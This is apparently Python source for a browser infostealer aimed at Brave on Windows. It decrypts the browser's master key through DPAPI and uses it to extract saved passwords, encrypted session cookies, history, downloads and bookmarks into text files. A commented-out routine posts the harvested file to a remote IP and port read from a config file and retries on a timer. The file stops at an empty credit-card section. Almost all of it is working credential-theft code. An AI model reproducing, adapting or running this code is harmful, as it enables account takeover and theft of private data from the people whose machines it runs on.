import sqlite3
import shutil
import base64
import json
import os
import requests
import threading
from Crypto.Cipher import AES
import win32crypt
import sys


def delete_file(file):
    try:
        os.remove(file)
    except:
        pass

def store_data(file, data):
    with open(file, "a", encoding="utf-8") as f:
        f.write("\n##########################################")
        f.write(data)
        f.write("##########################################")

def fetch_key(key_dir):
    try:
        try:
            dir_path = os.path.join(os.environ["USERPROFILE"], key_dir)
        except:
            return
            
        with open(dir_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return

def decrypt_string(string, key):
    try:
        i = string[3:15]
        string = string[15:]
        cipher = AES.new(key, AES.MODE_GCM, i)
        return cipher.decrypt(string)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(string, None, None, None, 0)[1])
        except:
            return "String could not be decrypted or none were found!"

#def get_url():
#   try:
#        with open("todo.txt", "r") as f:
#           lines = f.readlines()
#           ip_address = lines[0].strip()
#           interval = int(lines[1])
#           port = lines[2]
#           f.close()
#        return (ip_address, interval, port)
#   except:
#       return (None, None, None)
#def send(file):
#    try:
#        with open(file, "r") as f:
#            payload = json.dumps({"content": f.read()})
#            requests.post(f"http://{get_url()[0]}:{get_url()[2]}", data=payload, headers={"Content-Type": "application/json"})
#        delete_file("data.db")
#        return
#    except:
#        try:
#            timer = threading.Timer(get_url()[1], send)
#            timer.start()
#        except:
#            return
        
##
##Extract passwords
##
  
def load_path(id):
    try:
        with open("todo.txt", "r") as f:
            lines = f.readlines()
            dir_path = lines[3].strip()
            db_path = lines[4]
            f.close()
    except:
        return
        
    if id == "dir":
        return dir_path
    elif id == "db":
        return db_path

def save_passwords(db_dir, key_dir):
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], db_dir)
    except:
        sys.exit(0)
    file = "passwords.db"
    try:
        shutil.copyfile(db_path, file)
    except:
        sys.exit(0)
        
    db = sqlite3.connect(file)
    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "" order by date_last_used")

    for row in cursor.fetchall():
        main_url = row[0]
        login_url = row[1]
        username = row[2]
        date_created = row[4]
        last_usage = row[5]

        if username or decrypt_string(row[3], fetch_key(key_dir)):
            data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_string(row[3], fetch_key(key_dir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
            store_data("passwords.txt", data)
        else:
            continue

    with open("passwords.txt", "a", encoding="utf-8") as f:
        f.write(f"\n################==Encryption-Key==################\n{fetch_key(key_dir)}")

    cursor.close()
    db.close()
    delete_file(file)
    #send("passwords.txt")

save_passwords(load_path("db"), load_path("dir"))

##
##Extract cookies
##

def fetch_cookies(dir):
    try:
        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
        shutil.copyfile(file, "cookies.db")
        
        conn = sqlite3.connect("cookies.db")
        query = 'SELECT name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies'
        cursor = conn.execute(query)
    except:
        pass
    try:
        for row in cursor:
            name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
            
            cookie = f"\nName: {name}\nValue: {value}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
            store_data("cookies.txt", cookie)
        conn.close()
        delete_file("cookies.db")
    except:
        pass

fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")

##
##Extract encrypted cookies and decrypt them
##

def d_fetch_cookies(dir):
    try:
        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
        shutil.copy(file, "cookies.db")
        
        conn = sqlite3.connect("cookies.db")
        query = 'SELECT name, encrypted_value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies'
        cursor = conn.execute(query)
    except:
        pass
    key = fetch_key(load_path("dir"))
    try:
        for row in cursor:
            name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
            
            cookie = f"\nName: {name}\nValue: {decrypt_string(value, key)}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
            store_data("Brave-cookies.txt", cookie)
        conn.close()
        delete_file("cookies.db")
    except:
        pass

d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")

##
##Extract history
##

def fetch_history(dir):
    try:
        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
        shutil.copy(file, "history.db")
        
        conn = sqlite3.connect("history.db")
        query = "SELECT url, title, visit_count, typed_count, last_visit_time FROM urls"
        cursor = conn.execute(query)
    except:
        pass
    
    try:
        for row in cursor:
            url, title, visit_count, typed_count, last_visit = row
            
            history = f"\nURL: {url}\nTitle: {title}\nVisits: {visit_count}\nTyped: {typed_count}\nLast visit: {last_visit}\n"
            store_data("history.txt", history)
        conn.close()
        delete_file("history.db")
    except:
        pass
    
    
fetch_history(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")

##
##Extract downloads
##

def fetch_downloads(dir):
    try:
        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
        shutil.copy(file, "history.db")
        
        conn = sqlite3.connect("history.db")
        query = "SELECT target_path, total_bytes, end_time, opened, tab_url FROM downloads"
        cursor = conn.execute(query)
    except:
        pass
    
    try:
        for row in cursor:
            target_path, total_bytes, end_time, opened, tab_url = row
            
            history = f"\nPath: {target_path}\nSize(bytes): {total_bytes}\nTime: {end_time}\nOpened: {opened}\nURL: {tab_url}\n"
            store_data("downloads.txt", history)
        conn.close()
        delete_file("history.db")
    except:
        pass
    
fetch_downloads(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")

##
##Extract bookmarks
##

def fetch_bookmarks(dir):
    try:
        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
        shutil.copy(file, "bookmarks.json")
        with open("bookmarks.json", "r", encoding="utf-8") as f:
            bookmarks_data = json.load(f)
    except:
        return

    def extract_bookmarks(bookmarks_raw, folder=""):
        bookmarks = []
        try:
            for item in bookmarks_raw["children"]:
                if item["type"] == "folder":
                    folder_bookmarks = extract_bookmarks(item, item["name"])
                    bookmarks.extend(folder_bookmarks)
                else:
                    name = item["name"]
                    url = item["url"]
                    created = item["date_added"]
                    last_used = item["date_last_used"]
                    bookmarks.append({"name": name, "url": url, "created": created, "used": last_used, "folder": folder})
            return bookmarks
        except:
            return bookmarks

    try:
        bookmarks = extract_bookmarks(bookmarks_data["roots"]["bookmark_bar"])
        for bookmark in bookmarks:
            name = bookmark["name"]
            url = bookmark["url"]
            created = bookmark["created"]
            last_used = bookmark["used"]
            folder = bookmark["folder"]
            bookmark_ = f"\nName: {name}\nURL: {url}\nLast Used: {last_used}\nCreated: {created}\nFolder name: {folder}\n"
            store_data("bookmarks.txt", bookmark_)
        delete_file("bookmarks.json")
    except:
        pass
        
fetch_bookmarks(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks")

##
##Extract credit cards
##

